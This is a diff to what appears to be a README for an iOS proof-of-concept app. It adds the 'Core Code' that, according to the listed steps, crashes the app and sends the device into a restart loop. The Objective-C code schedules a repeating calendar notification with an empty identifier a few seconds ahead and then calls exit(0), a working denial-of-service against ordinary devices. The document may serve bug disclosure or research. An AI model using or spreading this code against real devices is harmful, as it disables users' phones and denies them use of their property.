@@ -19,3 +19,52 @@ English
 ==============
 1.Click ready button, allow app authorization.<br>
 2.Click start button, app clash, and device restart again and again.<br>
+
+<br/>
+---
+Core Code
+==============
+```objective-c
+    UNMutableNotificationContent *content = [[UNMutableNotificationContent alloc] init];
+    content.badge = @2;
+    content.body = @"body";
+    content.sound = [UNNotificationSound defaultSound];
+    content.subtitle = @"subtitle";
+    content.title = @"title";
+    
+    NSDate *date = [NSDate new];
+    NSDateFormatter *formatter = [NSDateFormatter new];
+    [formatter setDateFormat:@"yyyy"];
+    NSInteger currentYear=[[formatter stringFromDate:date] integerValue];
+    [formatter setDateFormat:@"MM"];
+    NSInteger currentMonth=[[formatter stringFromDate:date]integerValue];
+    [formatter setDateFormat:@"dd"];
+    NSInteger currentDay=[[formatter stringFromDate:date] integerValue];
+    [formatter setDateFormat:@"HH"];
+    NSInteger currentHour=[[formatter stringFromDate:date] integerValue];
+    [formatter setDateFormat:@"mm"];
+    NSInteger currentMinute=[[formatter stringFromDate:date] integerValue];
+    [formatter setDateFormat:@"ss"];
+    NSInteger currentSecond=[[formatter stringFromDate:date] integerValue];
+    
+    if (currentSecond + 2 > 59) {
+        currentMinute = currentMinute + 1;
+        currentSecond = 0;
+    } else {
+        currentSecond = currentSecond + 2;
+    }
+    
+    NSDateComponents *components = [NSDateComponents new];
+    components.year = currentYear;
+    components.month = currentMonth;
+    components.day = currentDay;
+    components.hour = currentHour;
+    components.minute = currentMinute;
+    components.second = currentSecond;
+    
+    UNCalendarNotificationTrigger *trigger = [UNCalendarNotificationTrigger triggerWithDateMatchingComponents:components repeats:YES];
+    UNNotificationRequest *request = [UNNotificationRequest requestWithIdentifier:@"" content:content trigger:trigger];
+    [[UNUserNotificationCenter currentNotificationCenter] addNotificationRequest:request withCompletionHandler:^(NSError * _Nullable error) {
+        exit(0);
+    }];
+```
